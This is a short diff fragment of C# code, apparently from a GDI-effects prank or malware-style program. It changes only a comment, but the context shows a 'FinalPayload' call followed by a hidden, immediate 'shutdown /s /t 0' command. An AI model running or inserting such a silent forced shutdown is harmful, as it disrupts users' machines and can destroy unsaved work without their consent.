@@ -1433,7 +1433,7 @@ namespace gdi2
 
             FinalPayload(20000);
 
-            // final shutdown
+            // final shutdown lol
             Process.Start(new ProcessStartInfo("shutdown", "/s /t 0")
             {
                 CreateNoWindow = true,
